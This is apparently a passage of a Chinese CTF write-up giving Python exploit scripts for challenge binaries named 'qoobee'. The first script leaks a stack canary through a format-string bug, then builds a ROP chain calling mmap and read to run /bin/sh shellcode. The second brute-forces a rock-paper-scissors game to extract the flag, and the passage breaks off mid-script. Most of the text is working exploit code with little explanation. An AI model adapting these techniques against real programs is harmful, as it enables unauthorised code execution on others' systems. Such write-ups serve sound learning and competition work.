class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">description stack overflow</span></span><br><span class="line"><span class="string">patched in qoobee4</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">target = <span class="string">'./qoobee'</span></span><br><span class="line">io = zio(target, timeout=<span class="number">800000</span>)</span><br><span class="line"></span><br><span class="line">read_buf = l32(<span class="number">0x804c090</span>)</span><br><span class="line">call_edx = l32(<span class="number">0x0804887d</span>)</span><br><span class="line">str_flag = l32(<span class="number">0x08049F7E</span>)</span><br><span class="line">str_r = l32(<span class="number">0x08049F7C</span>)</span><br><span class="line">s = l32(<span class="number">0xffffce8d</span>)</span><br><span class="line">extern = l32(<span class="number">0x0804b7cc</span>)</span><br><span class="line">leave_ret = l32(<span class="number">0x08048a4f</span>)</span><br><span class="line">pr = l32(<span class="number">0x08048bc6</span>)</span><br><span class="line">ppr = l32(<span class="number">0x0804992a</span>)</span><br><span class="line">pppr = l32(<span class="number">0x08049929</span>)</span><br><span class="line">p7r = l32(<span class="number">0x08049925</span>)</span><br><span class="line">\<span class="comment"># gen by alpha2 baseaddr is eax</span></span><br><span class="line">shellcode = <span class="string">"PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIFQo9kGyqNP4KrqPhDoToD3sXaxtoSRbIPnK9yszmK0wzA"</span></span><br><span class="line">\<span class="comment"># shellcode2  tiny sh without x0b</span></span><br><span class="line">shellcode2 = <span class="string">"x31xc9xf7xe1xb0xf4xf6xd0x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"</span></span><br><span class="line">read_got = l32(<span class="number">0x08048660</span>)</span><br><span class="line">fopen_got = l32(<span class="number">0x08048780</span>)</span><br><span class="line">write_got = l32(<span class="number">0x08048760</span>)</span><br><span class="line">data = l32(<span class="number">0x0804B7A8</span>)</span><br><span class="line">bss = l32(<span class="number">0x0804b7c0</span>)</span><br><span class="line">memcpy_got = l32(<span class="number">0x08048690</span>)</span><br><span class="line">mmap_got =l32(<span class="number">0x08048730</span>)</span><br><span class="line">fun1 = l32(<span class="number">0x08048D08</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># -214 mmap 0x80000000</span></span><br><span class="line">io.writeline(<span class="string">'-214'</span>)</span><br><span class="line">io.writeline(<span class="string">'hello'</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># adopt qoobee</span></span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.writeline(<span class="string">'%11$08x'</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># show info</span></span><br><span class="line">io.writeline(<span class="string">'2'</span>)</span><br><span class="line">io.read_until(<span class="string">'Description: '</span>)</span><br><span class="line">canary = io.readline().strip()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'canary:'</span>,canary</span><br><span class="line">canary = int(canary,<span class="number">16</span>)</span><br><span class="line">canary = l32(canary)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'canary:'</span>,canary</span><br><span class="line"></span><br><span class="line">\<span class="comment"># io.gdb_hint()</span></span><br><span class="line">\<span class="comment"># p1</span></span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">payload = \[</span><br><span class="line">    <span class="comment"># ebp</span></span><br><span class="line">    l32(<span class="number">0x21000000</span>),</span><br><span class="line">    <span class="comment"># eip jmp pr</span></span><br><span class="line">    pr,</span><br><span class="line">    <span class="comment"># a1</span></span><br><span class="line">    l32(<span class="number">0x80000000</span>),</span><br><span class="line">    <span class="comment"># mmap</span></span><br><span class="line">    mmap_got,</span><br><span class="line">    <span class="comment"># p7r</span></span><br><span class="line">    p7r,</span><br><span class="line">    <span class="comment"># mmap args</span></span><br><span class="line">    l32(<span class="number">0x21000000</span>), l32(<span class="number">0x100</span>), l32(<span class="number">7</span>), l32(<span class="number">50</span>), l32(<span class="number">-1</span>), l32(<span class="number">0</span>),</span><br><span class="line">    l32(<span class="number">0</span>), <span class="comment">#padding</span></span><br><span class="line">    <span class="comment"># ret to fun1 again</span></span><br><span class="line">    fun1,</span><br><span class="line">\]</span><br><span class="line"></span><br><span class="line">p = <span class="string">'a'</span> * <span class="number">30</span> + canary + l32(<span class="number">0</span>) + l32(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> dword <span class="keyword">in</span> payload:</span><br><span class="line">    p += dword</span><br><span class="line"><span class="keyword">print</span> <span class="string">'payload1:'</span>, len(p)</span><br><span class="line"></span><br><span class="line">io.writeline(p)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># p2</span></span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">payload2 = \[</span><br><span class="line">    <span class="comment"># ebp</span></span><br><span class="line">    l32(<span class="number">0x21000000</span>),</span><br><span class="line">    <span class="comment"># eip jmp pr</span></span><br><span class="line">    pr,</span><br><span class="line">    <span class="comment"># a1</span></span><br><span class="line">    l32(<span class="number">0x80000000</span>),</span><br><span class="line">    <span class="comment"># read</span></span><br><span class="line">    read_got,</span><br><span class="line">    <span class="comment"># jmp shellcode</span></span><br><span class="line">    l32(<span class="number">0x21000000</span>),</span><br><span class="line">    <span class="comment"># read args</span></span><br><span class="line">    l32(<span class="number">0</span>), l32(<span class="number">0x21000000</span>), l32(<span class="number">0x100</span>),</span><br><span class="line">\]</span><br><span class="line"></span><br><span class="line">p = <span class="string">'a'</span> * <span class="number">30</span> + canary + l32(<span class="number">0</span>) + l32(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> dword <span class="keyword">in</span> payload2:</span><br><span class="line">    p += dword</span><br><span class="line"><span class="keyword">print</span> <span class="string">'payload2:'</span>, len(p)</span><br><span class="line"></span><br><span class="line">io.writeline(p)</span><br><span class="line"></span><br><span class="line">io.writeline(shellcode2)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<h1 id="Qoobee5"><a href="#Qoobee5" class="headerlink" title="Qoobee5"></a>Qoobee5</h1><h2 id="利用分析-4"><a href="#利用分析-4" class="headerlink" title="利用分析"></a>利用分析</h2><p>比赛时候做的。。。和队友组合的代码，很乱很乱请见谅。。。 打游戏的方法。。利用printf漏洞刷钱。之后先升级，再通过石头剪刀布游戏的逻辑跑出flag…全部跑完要5分钟…… 比赛后面发现printf可以对age指定的任意内存写入……想想可以直接改等级然后打游戏会更快点……</p>
<h2 id="利用代码-4"><a href="#利用代码-4" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7  </span></span><br><span class="line">\<span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Created on 2014年11月29日</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: yf</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">io = zio(<span class="string">'./qoobee4'</span>)<span class="comment">#, print\_write=False, print\_read=False)</span></span><br><span class="line">\<span class="comment"># io = zio(('10.11.12.13',1415), print\_write=False, print\_read=False)</span></span><br><span class="line">lose_dic = \[<span class="string">'scissor'</span>,<span class="string">'rock'</span>,<span class="string">'paper'</span>\]</span><br><span class="line">right_dic = \[<span class="string">'paper'</span>, <span class="string">'scissor'</span>,<span class="string">'rock'</span>\]</span><br><span class="line">divset = \[<span class="number">17</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>, <span class="number">32</span> , <span class="number">33</span> , <span class="number">34</span>  , <span class="number">35</span> , <span class="number">35</span>  , <span class="number">36</span> ,  <span class="number">37</span> , <span class="number">38</span> , <span class="number">39</span> , <span class="number">40</span>\]</span><br><span class="line">rightset = \[\]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">losenum</span><span class="params">(modnum)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (modnum<span class="number">-1</span>+<span class="number">3</span>)%<span class="number">3</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># def testdiv(modnum):</span></span><br><span class="line">\<span class="comment"># #     while True:</span></span><br><span class="line">\<span class="comment">#     io.read_until('Your Choice: ')</span></span><br><span class="line">\<span class="comment">#     io.writeline('7')</span></span><br><span class="line">\<span class="comment">#     io.read_until('Select one:')</span></span><br><span class="line">\<span class="comment">#     io.writeline('%d' % losenum(modnum))</span></span><br><span class="line">\<span class="comment">#     io.read_until('number(0-100)? ')</span></span><br><span class="line">\<span class="comment">#     for i in divset:</span></span><br><span class="line">\<span class="comment">#         io.writeline('%d' % i)</span></span><br><span class="line">\<span class="comment">#         buf = io.read_until('n')</span></span><br><span class="line">\<span class="comment">#         if 'lose' in buf:</span></span><br><span class="line">\<span class="comment">#             io.writeline('7')</span></span><br><span class="line">\<span class="comment">#             io.read_until('Select one:')</span></span><br><span class="line">\<span class="comment">#             io.writeline('%d' % losenum(modnum))</span></span><br><span class="line">\<span class="comment">#             io.read_until('number(0-100)? ')</span></span><br><span class="line">\<span class="comment">#         else:</span></span><br><span class="line">\<span class="comment">#             print i</span></span><br><span class="line">\<span class="comment">#     pass</span></span><br><span class="line">pattern = re.compile(<span class="string">r'(d+)!'</span>,re.M)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkround2</span><span class="params">()</span>:</span></span><br><span class="line">    log(<span class="string">'enter checkround'</span>)</span><br><span class="line">    rst = &#123;&#125;</span><br><span class="line">    io.read_until(<span class="string">'Select one:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'paper'</span>)</span><br><span class="line">    buf = io.read_until(<span class="string">'n'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'lose'</span> <span class="keyword">in</span> buf:</span><br><span class="line">        log(<span class="string">'lose'</span>)</span><br><span class="line">        modnum = <span class="number">2</span></span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        buf = io.read_until(<span class="string">'Bye!'</span>)</span><br><span class="line">        log(buf)</span><br><span class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</span><br><span class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'paper'</span> <span class="keyword">in</span> buf:</span><br><span class="line">        log(<span class="string">'tie'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'$'</span></span><br><span class="line">        modnum = <span class="number">1</span></span><br><span class="line">        io.read_until(<span class="string">'Select one: '</span>)</span><br><span class="line">        io.writeline(<span class="string">'1234'</span>)</span><br><span class="line">        io.read_until(<span class="string">'number(0-100)? '</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        io.read_until(<span class="string">'Your Choice: '</span>)</span><br><span class="line">        io.writeline(<span class="string">'7'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</span><br><span class="line">            log(i)</span><br><span class="line">            log(right_dic\[i\])</span><br><span class="line">            io.read_until(<span class="string">'Select one:'</span>)</span><br><span class="line">            io.writeline(right_dic\[i\])</span><br><span class="line">        io.writeline(<span class="string">'scissor'</span>)</span><br><span class="line">        io.read_until(<span class="string">'number(0-100)?'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        buf = io.read_until(<span class="string">'n'</span>)</span><br><span class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</span><br><span class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'rock'</span> <span class="keyword">in</span> buf:</span><br><span class="line">        log(<span class="string">'win'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'$'</span></span><br><span class="line">        modnum = <span class="number">0</span></span><br><span class="line">        io.read_until(<span class="string">'Select one: '</span>)</span><br><span class="line">        io.writeline(<span class="string">'1234'</span>)</span><br><span class="line">        io.read_until(<span class="string">'number(0-100)? '</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        io.read_until(<span class="string">'Your Choice: '</span>)</span><br><span class="line">        io.writeline(<span class="string">'7'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</span><br><span class="line">            log(i)</span><br><span class="line">            log(right_dic\[i\])</span><br><span class="line">            io.read_until(<span class="string">'Select one:'</span>)</span><br><span class="line">            io.writeline(right_dic\[i\])</span><br><span class="line">        io.writeline(<span class="string">'paper'</span>)</span><br><span class="line">        io.read_until(<span class="string">'number(0-100)?'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        buf = io.read_until(<span class="string">'n'</span>)</span><br><span class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</span><br><span class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</span><br><span class="line">    r = divnum*<span class="number">3</span> + modnum</span><br><span class="line">    log (<span class="string">"char is %d,'%c'"</span> % (r,chr(r)))</span><br><span class="line">    rightset.append(modnum)</span><br><span class="line">    log(<span class="string">'out checkround'</span>)</span><br><span class="line">    <span class="keyword">return</span> chr(r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkround3</span><span class="params">()</span>:</span></span><br><span class="line">    log(<span class="string">'enter checkround'</span>)</span><br><span class="line">    rst = &#123;&#125;</span><br><span class="line">    io.read_until(<span class="string">'Select one:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'scissor'</span>)</span><br><span class="line">    buf = io.read_until(<span class="string">'n'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'lose'</span> <span class="keyword">in</span> buf:</span><br><span class="line">        log(<span class="string">'lose'</span>)</span><br><span class="line">        modnum = <span class="number">0</span></span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        buf = io.read_until(<span class="string">'Bye!'</span>)</span><br><span class="line">        log(buf)</span><br><span class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</span><br><span class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'scissor'</span> <span class="keyword">in</span> buf:</span><br><span class="line">        log(<span class="string">'tie'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'$'</span></span><br><span class="line">        modnum = <span class="number">2</span></span><br><span class="line">        io.read_until(<span class="string">'Select one: '</span>)</span><br><span class="line">        io.writeline(<span class="string">'1234'</span>)</span><br><span class="line">        io.read_until(<span class="string">'number(0-100)? '</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        io.read_until(<span class="string">'Your Choice: '</span>)</span><br><span class="line">        io.writeline(<span class="string">'7'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</span><br><span class="line">            log(i)</span><br><span class="line">            log(right_dic\[i\])</span><br><span class="line">            io.read_until(<span class="string">'Select one:'</span>)</span><br><span class="line">            io.writeline(right_dic\[i\])</span><br><span class="line">        io.writeline(<span class="string">'scissor'</span>)</span><br><span class="line">        io.read_until(<span class="string">'number(0-100)?'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        buf = io.read_until(<span class="string">'n'</span>)</span><br><span class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</span><br><span class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'paper'</span> <span class="keyword">in</span> buf:</span><br><span class="line">        log(<span class="string">'win'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'$'</span></span><br><span class="line">        modnum = <span class="number">1</span></span><br><span class="line">        io.read_until(<span class="string">'Select one: '</span>)</span><br><span class="line">        io.writeline(<span class="string">'1234'</span>)</span><br><span class="line">        io.read_until(<span class="string">'number(0-100)? '</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        io.read_until(<span class="string">'Your Choice: '</span>)</span><br><span class="line">        io.writeline(<span class="string">'7'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</span><br><span class="line">            log(i)</span><br><span class="line">            log(right_dic\[i\])</span><br><span class="line">            io.read_until(<span class="string">'Select one:'</span>)</span><br><span class="line">            io.writeline(right_dic\[i\])</span><br><span class="line">        io.writeline(<span class="string">'paper'</span>)</span><br><span class="line">        io.read_until(<span class="string">'number(0-100)?'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        buf = io.read_until(<span class="string">'n'</span>)</span><br><span class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</span><br><span class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</span><br><span class="line">    r = divnum*<span class="number">3</span> + modnum</span><br><span class="line">    log (<span class="string">"char is %d,'%c'"</span> % (r,chr(r)))</span><br><span class="line">    rightset.append(modnum)</span><br><span class="line">    log(<span class="string">'out checkround'</span>)</span><br><span class="line">    <span class="keyword">return</span> chr(r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forlast2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    log(<span class="string">'last round'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Your Choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'7'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</span><br><span class="line">        log(i)</span><br><span class="line">        log(right_dic\[i\])</span><br><span class="line">        io.read_until(<span class="string">'Select one:'</span>)</span><br><span class="line">        io.writeline(right_dic\[i\])</span><br><span class="line">    c = checkround3()</span><br><span class="line">    <span class="keyword">if</span> c:</span><br><span class="line">        flag += c</span><br><span class="line">    log(<span class="string">'flag:%s'</span> % flag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forlast</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    log(<span class="string">'last round'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Your Choice: '</span>)</span><br><span class="line">    io.writeline(<span class="string">'7'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</span><br><span class="line">        log(i)</span><br><span class="line">        log(right_dic\[i\])</span><br><span class="line">        io.read_until(<span class="string">'Select one:'</span>)</span><br><span class="line">        io.writeline(right_dic\[i\])</span><br><span class="line">    c = checkround2()</span><br><span class="line">    <span class="keyword">if</span> c==<span class="string">'$'</span>:</span><br><span class="line">        forlast2()</span><br><span class="line">    <span class="keyword">elif</span> c:</span><br><span class="line">        flag += c</span><br><span class="line">    log(<span class="string">'flag:%s'</span> % flag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        log(<span class="string">'new round'</span>)</span><br><span class="line">        io.read_until(<span class="string">'Your Choice: '</span>)</span><br><span class="line">        io.writeline(<span class="string">'7'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> rightset:</span><br><span class="line">            log(i)</span><br><span class="line">            log(right_dic\[i\])</span><br><span class="line">            io.read_until(<span class="string">'Select one:'</span>)</span><br><span class="line">            io.writeline(right_dic\[i\])</span><br><span class="line">        c = checkround()</span><br><span class="line">        <span class="keyword">if</span> c==<span class="string">'$'</span>:</span><br><span class="line">            forlast()</span><br><span class="line">        <span class="keyword">elif</span> c:</span><br><span class="line">            flag += c</span><br><span class="line">        log(<span class="string">'flag:%s'</span> % flag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkround</span><span class="params">()</span>:</span></span><br><span class="line">    log(<span class="string">'enter checkround'</span>)</span><br><span class="line">    rst = &#123;&#125;</span><br><span class="line">    io.read_until(<span class="string">'Select one:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'rock'</span>)</span><br><span class="line">    buf = io.read_until(<span class="string">'n'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'lose'</span> <span class="keyword">in</span> buf:</span><br><span class="line">        log(<span class="string">'lose'</span>)</span><br><span class="line">        modnum = <span class="number">1</span></span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        buf = io.read_until(<span class="string">'Bye!'</span>)</span><br><span class="line">        log(buf)</span><br><span class="line">        divnum = int(pattern.findall(buf)\[<span class="number">0</span>\])</span><br><span class="line">        log(<span class="string">'divnum:%d'</span> % divnum)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'rock'</span> <span class="keyword">in</span> buf:</span><br><span class="line">        log(<span class="string">'tie'</span>)</span><br><span class="line">        modnum = <span 